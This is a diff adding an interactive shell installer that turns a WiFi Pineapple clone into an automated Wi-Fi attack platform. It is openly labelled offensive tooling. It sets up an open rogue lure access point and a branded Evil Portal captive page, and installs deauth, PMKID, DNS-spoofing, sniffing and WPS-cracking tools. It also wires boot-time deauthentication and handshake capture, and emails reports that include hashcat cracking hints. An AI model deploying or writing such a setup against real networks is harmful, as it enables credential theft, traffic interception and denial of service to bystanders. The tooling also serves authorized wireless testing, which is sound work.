@@ -1,0 +1,387 @@
+#!/bin/sh
+# =============================================================================
+#  Shadow-Apple-Installer  ·  setup.sh
+#  Interactive, production-grade configurator for a freshly-flashed
+#  WiFi Pineapple Cloner (GL.iNet AR300M-class "Shadow").
+#
+#  RUN ON THE DEVICE (needs a TTY for prompts):
+#     cat setup.sh | ssh root@172.16.42.1 "cat > /tmp/setup.sh"
+#     ssh -t root@172.16.42.1 "sh /tmp/setup.sh"
+#  ...or paste into the panel's Terminal module.
+#
+#  It asks what you want, applies only what you choose, and never hard-codes
+#  personal data. See the README for the full feature list.
+#
+#  ⚠ Offensive Wi-Fi tooling. Authorized testing only. See docs/LEGAL.md.
+# =============================================================================
+export LD_LIBRARY_PATH=/sd/usr/lib:/sd/lib:/usr/lib:/lib
+TTY=/dev/tty; [ -r "$TTY" ] || TTY=/dev/stdin
+COMMUNITY="https://raw.githubusercontent.com/xchwarze/wifi-pineapple-community/main"
+
+c_b()  { printf '\033[1m%s\033[0m\n' "$*"; }
+c_ok() { printf '  \033[32m✓\033[0m %s\n' "$*"; }
+c_hr() { printf '\033[2m----------------------------------------------------------\033[0m\n'; }
+die()  { printf '\033[31mERROR:\033[0m %s\n' "$*" >&2; exit 1; }
+ask()  { _d="${2:-}"; if [ -n "$_d" ]; then printf '%s [%s]: ' "$1" "$_d" >&2; else printf '%s: ' "$1" >&2; fi
+         IFS= read -r _a <"$TTY" || true; [ -z "$_a" ] && _a="$_d"; printf '%s' "$_a"; }
+askpw(){ printf '%s: ' "$1" >&2; stty -echo <"$TTY" 2>/dev/null || true; IFS= read -r _a <"$TTY" || true
+         stty echo <"$TTY" 2>/dev/null || true; printf '\n' >&2; printf '%s' "$_a"; }
+yesno(){ _d="${2:-y}"; printf '%s [%s]: ' "$1" "$_d" >&2; IFS= read -r _a <"$TTY" || true; [ -z "$_a" ] && _a="$_d"
+         case "$_a" in y|Y|yes|YES) return 0;; *) return 1;; esac; }
+sedesc(){ printf '%s' "$1" | sed 's/\\/\\\\/g; s/[\/&]/\\&/g'; }   # safe for sed replacement
+
+[ -d /pineapple ] || die "This must run on a flashed WiFi Pineapple Cloner (no /pineapple found). Flash first with flash.sh."
+
+c_b "=================================================================="
+c_b "   Shadow-Apple-Installer  —  interactive setup"
+c_b "=================================================================="
+echo "Answer the prompts (Enter = default). Nothing is applied until you confirm."
+echo
+
+# ---------------------------------------------------------------- PROMPTS ----
+c_b "[1/8] Identity"
+HOSTNAME=$(ask "Hostname" "SHADOW-APPLE")
+ROOTPW=$(askpw "Root / panel password (blank = leave unchanged)")
+
+c_b "[2/8] Internet uplink (Wi-Fi client mode)"
+DO_UPLINK=y; yesno "Connect this device to a Wi-Fi network for internet?" "y" || DO_UPLINK=n
+if [ "$DO_UPLINK" = y ]; then
+  UPLINK_SSID=$(ask "  Upstream Wi-Fi SSID" "")
+  UPLINK_PW=$(askpw "  Upstream Wi-Fi password")
+fi
+
+c_b "[3/8] Access points"
+ROGUE_SSID=$(ask "Open/rogue AP name (the lure SSID clients see)" "FreeWiFi")
+DO_MGMT=y; yesno "Broadcast a private management AP too?" "y" || DO_MGMT=n
+if [ "$DO_MGMT" = y ]; then
+  MGMT_SSID=$(ask "  Management AP name" "${HOSTNAME}-MGMT")
+  MGMT_PW=$(askpw "  Management AP password (blank = root password)")
+  [ -z "$MGMT_PW" ] && MGMT_PW="$ROOTPW"
+  if [ ${#MGMT_PW} -lt 8 ]; then echo "  [!] Management AP password is <8 chars (WPA2 needs 8+). Skipping the management AP." >&2; DO_MGMT=n; fi
+fi
+
+c_b "[4/8] Modules"
+echo "  curated = a strong ~30-module set · all = everything · none = skip · pick = choose"
+MODSET=$(ask "Module set (curated/all/none/pick)" "curated")
+
+c_b "[5/8] Evil Portal (captive guest page)"
+DO_PORTAL=y; yesno "Install the branded captive portal?" "y" || DO_PORTAL=n
+if [ "$DO_PORTAL" = y ]; then
+  PORTAL_HEADLINE=$(ask "  Portal headline" "Welcome to $ROGUE_SSID")
+  PORTAL_ACCENT=$(ask "  Accent colour (hex)" "#ff7a18")
+fi
+
+c_b "[6/8] Notifications (email reports)"
+DO_MAIL=n; yesno "Send periodic recon/handshake reports by email?" "n" && DO_MAIL=y
+if [ "$DO_MAIL" = y ]; then
+  SMTP_HOST=$(ask "  SMTP host" "smtp.forwardemail.net")
+  SMTP_PORT=$(ask "  SMTP port (465 SSL / 587 STARTTLS)" "465")
+  SMTP_USER=$(ask "  SMTP username" "")
+  SMTP_PASS=$(askpw "  SMTP password")
+  SMTP_FROM=$(ask "  From address" "$SMTP_USER")
+  REPORT_TO=$(ask "  Send reports to" "")
+  REPORT_HRS=$(ask "  Report interval (hours)" "2")
+fi
+
+c_b "[7/8] Operating mode"
+echo "  switch    = hardware slide switch: Left=recon, Right=deauth+capture (AR300M)"
+echo "  auto      = time-based: alternate recon and passive capture automatically"
+echo "  recon     = recon/discovery only"
+echo "  none      = don't auto-run anything at boot"
+MODE=$(ask "Boot mode (switch/auto/recon/none)" "switch")
+
+DO_PROTECT=n
+if [ "$MODE" = switch ] || [ "$MODE" = auto ]; then
+  c_b "[8/8] Protected networks (never deauthed)"
+  echo "  Enter your OWN SSIDs, comma-separated. Trailing * = prefix (e.g. Home* )."
+  PROTECT_RAW=$(ask "  Protected SSIDs" "")
+  [ -n "$PROTECT_RAW" ] && DO_PROTECT=y
+fi
+
+# ---------------------------------------------------------------- CONFIRM ----
+echo; c_hr; c_b "Summary"
+echo "  Hostname        : $HOSTNAME"
+echo "  Uplink          : $([ "$DO_UPLINK" = y ] && echo "$UPLINK_SSID" || echo "(none)")"
+echo "  Rogue/open AP   : $ROGUE_SSID"
+echo "  Management AP   : $([ "$DO_MGMT" = y ] && echo "$MGMT_SSID" || echo "(none)")"
+echo "  Modules         : $MODSET"
+echo "  Evil Portal     : $([ "$DO_PORTAL" = y ] && echo "yes ($PORTAL_HEADLINE)" || echo "no")"
+echo "  Email reports   : $([ "$DO_MAIL" = y ] && echo "every ${REPORT_HRS}h -> $REPORT_TO" || echo "no")"
+echo "  Boot mode       : $MODE"
+echo "  Protected SSIDs : $([ "$DO_PROTECT" = y ] && echo "$PROTECT_RAW" || echo "(none)")"
+c_hr
+yesno "Apply this configuration?" "y" || die "Aborted — nothing changed."
+echo
+
+# ---------------------------------------------------------------- APPLY ------
+mkdir -p /sd/bot /sd/handshakes /sd/reports /tmp/handshakes
+
+c_b "Applying…"
+# clear the panel first-run wizard (it re-sets password AND resets wireless if it runs)
+rm -f /etc/pineapple/setupRequired 2>/dev/null
+
+# hostname + password
+uci set system.@system[0].hostname="$HOSTNAME"; uci commit system; echo "$HOSTNAME" > /proc/sys/kernel/hostname
+[ -n "$ROOTPW" ] && printf '%s\n%s\n' "$ROOTPW" "$ROOTPW" | passwd root >/dev/null 2>&1
+c_ok "hostname=$HOSTNAME, password set"
+
+# ---- radio detection: onboard=uplink+mgmt, dual-band USB=monitor, 2.4 USB=source AP
+phy_for_path(){ for d in /sys/class/ieee80211/*; do dp=$(readlink -f "$d/device" 2>/dev/null)
+  case "$dp" in *"$1"*) basename "$d"; return;; esac; done; }
+is_dualband(){ iw phy "$1" info 2>/dev/null | grep -qE ' 5[0-9]{3}(\.[0-9])? MHz'; }
+USB24=""; USBDB=""; ONBOARD=""; i=0
+while uci -q get wireless.radio$i >/dev/null 2>&1; do
+  p=$(uci -q get wireless.radio$i.path 2>/dev/null)
+  case "$p" in
+    *usb*) phy=$(phy_for_path "$p"); if is_dualband "$phy"; then USBDB=$i; else USB24=$i; fi ;;
+    "") : ;; *) ONBOARD=$i ;;
+  esac; i=$((i+1))
+done
+c_ok "radios: onboard=radio${ONBOARD:-?} dual-band-USB=radio${USBDB:-?} 2.4-USB=radio${USB24:-?}"
+
+# put PineAP source (AP) on the 2.4 USB card, monitor on the dual-band card (path swap)
+SRC=$(uci -q get pineap.@config[0].pineap_source_interface)
+MON=$(uci -q get pineap.@config[0].pineap_interface)
+if [ "$SRC" = "wlan0" ] && [ "$MON" = "wlan1mon" ] && [ -n "$USB24" ] && [ -n "$USBDB" ]; then
+  P0=$(uci get wireless.radio$USB24.path); P1=$(uci get wireless.radio$USBDB.path)
+  uci set wireless.radio0.path="$P0"; uci set wireless.radio1.path="$P1"
+  uci set wireless.radio1.hwmode='11a'
+  c_ok "monitor=dual-band card, source AP=2.4 card"
+fi
+
+# rogue/open AP name on the source card
+uci set wireless.@wifi-iface[0].ssid="$ROGUE_SSID"; uci set wireless.@wifi-iface[0].encryption='none'
+
+# onboard radio: uplink STA + management AP + channel
+if [ -n "$ONBOARD" ] && [ "$DO_UPLINK" = y ]; then
+  UPCH=""
+  for sc in wlan${USBDB} wlan${USB24} wlan${ONBOARD}; do
+    ifconfig "$sc" up 2>/dev/null
+    UPCH=$(iwinfo "$sc" scan 2>/dev/null | awk -v s="\"$UPLINK_SSID\"" '$0 ~ "ESSID: "s{f=1} f&&/Channel:/{sub(/.*Channel: /,"");print $1;exit}')
+    [ -n "$UPCH" ] && break
+  done
+  [ -z "$UPCH" ] && UPCH=$(ask "  Couldn't auto-detect '$UPLINK_SSID' channel; enter it" "6")
+  # neutralize onboard placeholder ifaces, add STA + (optional) mgmt AP
+  idx=0; while uci -q get wireless.@wifi-iface[$idx] >/dev/null 2>&1; do
+    [ "$(uci -q get wireless.@wifi-iface[$idx].device)" = "radio$ONBOARD" ] && uci set wireless.@wifi-iface[$idx].disabled='1'
+    idx=$((idx+1)); done
+  S=$(uci add wireless wifi-iface)
+  uci set wireless.$S.device="radio$ONBOARD"; uci set wireless.$S.mode='sta'; uci set wireless.$S.ifname="wlan${ONBOARD}"
+  uci set wireless.$S.network='wwan'; uci set wireless.$S.ssid="$UPLINK_SSID"; uci set wireless.$S.encryption='psk2'; uci set wireless.$S.key="$UPLINK_PW"
+  if [ "$DO_MGMT" = y ]; then
+    A=$(uci add wireless wifi-iface)
+    uci set wireless.$A.device="radio$ONBOARD"; uci set wireless.$A.mode='ap'; uci set wireless.$A.ifname="wlan${ONBOARD}-1"
+    uci set wireless.$A.network='lan'; uci set wireless.$A.ssid="$MGMT_SSID"; uci set wireless.$A.encryption='psk2'; uci set wireless.$A.key="$MGMT_PW"
+  fi
+  uci set wireless.radio$ONBOARD.channel="$UPCH"
+  c_ok "uplink '$UPLINK_SSID' (ch $UPCH)$([ "$DO_MGMT" = y ] && echo " + mgmt AP '$MGMT_SSID'")"
+fi
+uci commit wireless
+
+# repeater: lan -> wwan forwarding
+if [ "$DO_UPLINK" = y ]; then
+  have=0; i=0; while uci -q get firewall.@forwarding[$i] >/dev/null 2>&1; do
+    [ "$(uci -q get firewall.@forwarding[$i].src)" = lan ] && [ "$(uci -q get firewall.@forwarding[$i].dest)" = wwan ] && have=1; i=$((i+1)); done
+  [ $have = 0 ] && { uci add firewall forwarding >/dev/null; uci set firewall.@forwarding[-1].src='lan'; uci set firewall.@forwarding[-1].dest='wwan'; uci commit firewall; }
+  c_ok "repeater forwarding lan->wwan"
+fi
+
+c_b "Applying Wi-Fi…"; wifi reload >/dev/null 2>&1; sleep 10
+[ "$DO_UPLINK" = y ] && { ifup wwan >/dev/null 2>&1; /etc/init.d/firewall reload >/dev/null 2>&1; sleep 6; }
+
+# wait for internet
+NET=0
+if [ "$DO_UPLINK" = y ]; then
+  printf "  waiting for internet"; n=0; while [ $n -lt 12 ]; do ping -q -c1 -W2 1.1.1.1 >/dev/null 2>&1 && { NET=1; break; }; printf "."; sleep 3; n=$((n+1)); done; echo
+  [ $NET = 1 ] && c_ok "internet up" || echo "  [!] no internet yet — package/module steps may be skipped."
+fi
+
+# USB /sd + missing packages
+if ! mount | grep -q ' /sd '; then
+  echo "  A USB drive will be FORMATTED for /sd — ALL data on it will be erased."
+  if yesno "  Format the attached USB now?" "y"; then c_b "Formatting USB -> /sd"; ( cd / && wpc-tools format_sd ) >/dev/null 2>&1; fi
+fi
+mount | grep -q ' /sd ' && c_ok "/sd mounted"
+uci set pineap.@config[0].recon_db_path='/sd/recon.db'; uci commit pineap
+[ $NET = 1 ] && { c_b "Installing missing packages (python/php)…"; ( cd / && wpc-tools missing_packages ) >/dev/null 2>&1; c_ok "missing packages"; }
+
+# modules
+if [ "$MODSET" != none ] && [ $NET = 1 ]; then
+  c_b "Installing modules…"
+  JSON=$(uclient-fetch -q -O- "$COMMUNITY/modules/build/modules.json" 2>/dev/null)
+  CURATED="Cabinet ConnectedClients DWall EvilPortal PortalAuth Responder SignalStrength SSIDManager MACInfo Locate LEDController Status OnlineHashCrack RandomRoll HTTPProxy get InternetSpeedTest Papers LogManager Deauth Occupineapple SiteSurvey PMKIDAttack Terminal nmap tcpdump ngrep p0f DNSspoof urlsnarf wps"
+  ALLM=$(printf '%s' "$JSON" | grep -o '"[A-Za-z0-9_]*":{' | sed 's/[":{]//g')
+  case "$MODSET" in
+    all) LIST="$ALLM" ;;
+    pick) LIST=""; for m in $ALLM; do yesno "  install $m?" "n" && LIST="$LIST $m"; done ;;
+    *) LIST="$CURATED" ;;
+  esac
+  mkdir -p /sd/tmp /sd/modules; OKM=0
+  for N in $LIST; do
+    [ -e "/sd/modules/$N" ] && continue
+    CK=$(printf '%s' "$JSON" | grep -o "\"$N\":{[^}]*}" | grep -o '"checksum":"[0-9a-f]\{64\}"' | sed 's/.*"checksum":"//;s/"//')
+    uclient-fetch -q -T 30 -O "/sd/tmp/$N.tar.gz" "$COMMUNITY/modules/build/$N.tar.gz" 2>/dev/null
+    GOT=$(sha256sum "/sd/tmp/$N.tar.gz" 2>/dev/null | awk '{print $1}')
+    if [ -n "$CK" ] && [ "$GOT" = "$CK" ] && tar -xzf "/sd/tmp/$N.tar.gz" -C /sd/modules/ 2>/dev/null; then
+      ln -sf "/sd/modules/$N" "/pineapple/modules/$N"; OKM=$((OKM+1)); fi
+    rm -f "/sd/tmp/$N.tar.gz"
+  done
+  c_ok "$OKM modules installed"
+  c_b "Installing module dependencies…"
+  for P in mdk3 hcxdumptool ttyd nmap tcpdump ngrep p0f dnsspoof urlsnarf reaver bully pixiewps libpcap; do
+    opkg --dest sd install "$P" >/dev/null 2>&1; done
+  c_ok "dependencies installed"
+fi
+
+# ---- embed device scripts ---------------------------------------------------
+__EMBED_LIB__
+
+# ---- email (msmtp) ----------------------------------------------------------
+if [ "$DO_MAIL" = y ] && [ -n "$SMTP_USER" ]; then
+  c_b "Configuring email…"; [ $NET = 1 ] && opkg --dest sd install msmtp ca-bundle >/dev/null 2>&1
+  TLSST=off; [ "$SMTP_PORT" = 587 ] && TLSST=on; mkdir -p /sd/etc
+  cat > /sd/etc/msmtprc <<MSMTP
+defaults
+auth on
+tls on
+tls_starttls $TLSST
+tls_trust_file /etc/ssl/certs/ca-certificates.crt
+logfile /sd/msmtp.log
+
+account fe
+host $SMTP_HOST
+port $SMTP_PORT
+from $SMTP_FROM
+user $SMTP_USER
+password $SMTP_PASS
+
+account default : fe
+MSMTP
+  chmod 600 /sd/etc/msmtprc
+  cat > /usr/bin/bot-mail <<MAIL
+#!/bin/sh
+SUBJ="\${1:-$HOSTNAME}"; TO="\${2:-$REPORT_TO}"
+export LD_LIBRARY_PATH=/sd/usr/lib:/sd/lib:/usr/lib:/lib
+{ printf 'From: $HOSTNAME <$SMTP_FROM>\nTo: %s\nSubject: %s\n\n' "\$TO" "\$SUBJ"; cat; } | /sd/usr/bin/msmtp -C /sd/etc/msmtprc -a fe "\$TO"
+MAIL
+  chmod +x /usr/bin/bot-mail
+  c_ok "email via $SMTP_HOST -> $REPORT_TO"
+fi
+
+# ---- report generator -------------------------------------------------------
+cat > /usr/bin/bot-report <<'RPT'
+#!/bin/sh
+export LD_LIBRARY_PATH=/sd/usr/lib:/sd/lib:/usr/lib:/lib
+export PYTHONHOME=/sd/usr
+DB=/sd/recon.db; HSD=/sd/handshakes; STATUS=/sd/handshakes/hcx-status.log
+TO="${1:-}"; TS=$(date '+%Y-%m-%d %H:%M %Z'); mkdir -p /sd/reports
+RPTF="/sd/reports/report_$(date +%Y%m%d_%H%M%S).txt"
+PC=$(ls -1 $HSD/*.pcapng 2>/dev/null | wc -l)
+HS=$(grep -oE 'MP:M[0-9]M[0-9].*\(.*\)$' "$STATUS" 2>/dev/null | sed -E 's/.*\((.*)\)$/\1/' | sort -u | grep -v '^$')
+HN=$(printf '%s\n' "$HS" | grep -c .)
+PM=$(grep -ci 'PMKID' "$STATUS" 2>/dev/null)
+{ echo "== $(uci get system.@system[0].hostname) report $TS =="; echo "Uptime:$(uptime)"
+  echo; echo "Handshake/PMKID capture: $PC pcapng files, $HN networks w/ EAPOL, $PM PMKID hits"
+  printf '%s\n' "$HS" | sed 's/^/   - /' | head -40
+  echo "   [extract: hcxpcapngtool $HSD/*.pcapng -o hs.22000 ; crack: hashcat -m 22000]"
+  echo; echo "Recon DB:"; [ -f "$DB" ] && /sd/usr/bin/python /sd/bot/recondump.py "$DB" 2>/dev/null || echo " (none)"
+} > "$RPTF" 2>&1
+[ -x /usr/bin/bot-mail ] && [ -n "$TO" ] && cat "$RPTF" | bot-mail "$(uci get system.@system[0].hostname) report ($HN HS-nets)" "$TO"
+echo "$(date) report $RPTF -> ${TO:-file only}" >> /sd/bot-report.log
+RPT
+chmod +x /usr/bin/bot-report
+
+# ---- protected SSIDs --------------------------------------------------------
+if [ "$DO_PROTECT" = y ]; then
+  { echo "# Protected SSIDs (never deauthed). Trailing * = prefix."
+    echo "$PROTECT_RAW" | tr ',' '\n' | sed 's/^ *//;s/ *$//' | grep -v '^$'
+  } > /sd/bot/protect-ssids.conf
+  [ -x /sd/bot/wl-refresh.sh ] && /sd/bot/wl-refresh.sh >/dev/null 2>&1
+  c_ok "protected list built"
+fi
+
+# ---- Evil Portal ------------------------------------------------------------
+if [ "$DO_PORTAL" = y ]; then
+  c_b "Installing captive portal…"
+  PDIR=/sd/portals/portal; mkdir -p "$PDIR"
+  # Primary accent is your choice; the secondary/tertiary shades stay warm to keep contrast readable.
+  __EMBED_PORTAL__
+  sed -i "s/{{NETWORK_NAME}}/$(sedesc "$ROGUE_SSID")/g;
+          s/{{PORTAL_TITLE}}/Guest WiFi Access/g;
+          s/{{BRAND_LABEL}}/Guest Network/g;
+          s/{{PORTAL_HEADLINE}}/$(sedesc "$PORTAL_HEADLINE")/g;
+          s#{{PORTAL_SUBTITLE}}#Complimentary internet access. Accept the terms to get online.#g;
+          s#{{TERMS_TEXT}}#<b>Terms of Use.</b> Courtesy public network provided as-is with no warranty. By connecting you agree to lawful, responsible use and acknowledge open-network traffic is not private. Do not transmit sensitive credentials over open WiFi.#g;
+          s/{{BUTTON_TEXT}}/Connect to Internet/g;
+          s/{{ACCENT}}/$(sedesc "$PORTAL_ACCENT")/g;
+          s/{{ACCENT2}}/#ff9d3c/g; s/{{ACCENT3}}/#ffb347/g" "$PDIR/index.php"
+  # activate it (symlink into /www, ensure captiveportal DNAT service on)
+  [ -f "$PDIR/MyPortal.php" ] || printf '<?php namespace evilportal;\nclass MyPortal extends Portal { public function handleAuthorization(){ parent::handleAuthorization(); } }\n' > "$PDIR/MyPortal.php"
+  [ -f "$PDIR/helper.php" ] || echo '<?php' > "$PDIR/helper.php"
+  echo '{"name":"portal","type":"basic"}' > "$PDIR/portal.ep"
+  for f in index.php MyPortal.php helper.php portal.ep; do [ -e "/www/$f" ] && [ ! -L "/www/$f" ] && mv "/www/$f" "/www/$f.ep_backup"; ln -sf "$PDIR/$f" "/www/$f"; done
+  ln -sf /pineapple/modules/EvilPortal/includes/api /www/captiveportal 2>/dev/null
+  c_ok "portal branded '$ROGUE_SSID' and activated"
+fi
+
+# ---- boot mode --------------------------------------------------------------
+c_b "Wiring boot mode: $MODE"
+# deauth module defaults (used by switch/auto modes + manual panel use)
+if [ "$MODE" = switch ] || [ "$MODE" = auto ]; then
+  touch /etc/config/deauth
+  uci -q get deauth.settings >/dev/null 2>&1 || { echo "config deauth 'run'"; echo "config deauth 'settings'"; echo "config deauth 'autostart'"; echo "config deauth 'module'"; } >> /etc/config/deauth
+  uci set deauth.settings.mode='whitelist'; uci set deauth.settings.channel='1,6,11,36,149'; uci set deauth.settings.channels='1,6,11,36,149'
+  uci set deauth.autostart.interface='wlan1mon'; uci set deauth.module.installed='1'; uci commit deauth
+fi
+BOOT_CMD=""
+case "$MODE" in
+  switch) BOOT_CMD="/sd/bot/switch-mode.sh" ;;
+  auto)   BOOT_CMD="/sd/bot/recon-capture-loop.sh 300 900" ;;
+  recon)  cat > /sd/bot/recon-only.sh <<'RO'
+#!/bin/sh
+export LD_LIBRARY_PATH=/sd/usr/lib:/sd/lib:/usr/lib:/lib
+while true; do pineap /tmp/pineap.conf run_scan 60 2 >/dev/null 2>&1
+  W=0; while [ $W -lt 75 ]; do pineap /tmp/pineap.conf get_status 2>/dev/null | grep scanRunning | grep -q true || break; sleep 5; W=$((W+5)); done; done
+RO
+          chmod +x /sd/bot/recon-only.sh; BOOT_CMD="/sd/bot/recon-only.sh" ;;
+esac
+if [ -n "$BOOT_CMD" ]; then
+  BN=$(basename "$(echo "$BOOT_CMD" | awk '{print $1}')")   # process name only (strip args)
+  cat > /usr/bin/bot-autostart <<AUTO
+#!/bin/sh
+export LD_LIBRARY_PATH=/sd/usr/lib:/sd/lib:/usr/lib:/lib
+mkdir -p /tmp/handshakes /sd/handshakes
+n=0; while ! pgrep pineapd >/dev/null 2>&1 && [ \$n -lt 20 ]; do /etc/init.d/pineapd start >/dev/null 2>&1; sleep 3; n=\$((n+1)); done
+sleep 5
+pineap /tmp/pineap.conf logging on >/dev/null 2>&1; pineap /tmp/pineap.conf capture_ssids on >/dev/null 2>&1
+pgrep -f "$BN" >/dev/null 2>&1 || ( $BOOT_CMD >/dev/null 2>&1 & )
+AUTO
+  [ "$DO_MAIL" = y ] && echo "( sleep 200; /usr/bin/bot-report $REPORT_TO ) >/dev/null 2>&1 &" >> /usr/bin/bot-autostart
+  chmod +x /usr/bin/bot-autostart
+  # add the boot hook: insert before 'exit 0' if present, else append (never clobber)
+  touch /etc/rc.local
+  if ! grep -q 'bot-autostart' /etc/rc.local; then
+    if grep -q '^exit 0' /etc/rc.local; then
+      awk '/^exit 0/ && !d {print "( sleep 30; /usr/bin/bot-autostart ) &"; d=1} {print}' /etc/rc.local > /tmp/rc.new && cat /tmp/rc.new > /etc/rc.local && rm -f /tmp/rc.new
+    else
+      echo '( sleep 30; /usr/bin/bot-autostart ) &' >> /etc/rc.local
+    fi
+  fi
+  ( sleep 2; /usr/bin/bot-autostart ) >/dev/null 2>&1 &
+  c_ok "boot mode '$MODE' wired + started"
+fi
+# report cron
+if [ "$DO_MAIL" = y ]; then
+  touch /etc/crontabs/root
+  grep -q 'bot-report' /etc/crontabs/root || echo "0 */$REPORT_HRS * * * /usr/bin/bot-report $REPORT_TO" >> /etc/crontabs/root
+  /etc/init.d/cron enable >/dev/null 2>&1; /etc/init.d/cron restart >/dev/null 2>&1
+  c_ok "report cron every ${REPORT_HRS}h"
+fi
+
+echo; c_hr; c_b "DONE — $HOSTNAME is configured."
+echo "  Panel : http://172.16.42.1:1471/   (root / your password)"
+[ "$DO_MGMT" = y ] && echo "  Wireless admin: join '$MGMT_SSID'"
+[ "$MODE" = switch ] && echo "  Switch: LEFT = recon (green LED) · RIGHT = deauth+capture (red LED)"
+[ "$MODE" = switch ] && echo "  ⚠ On boot, if the switch is RIGHT it will start deauthing — keep it LEFT unless intended."
+echo
+yesno "Reboot now to validate the full boot path?" "n" && { echo "Rebooting…"; sync; reboot; }
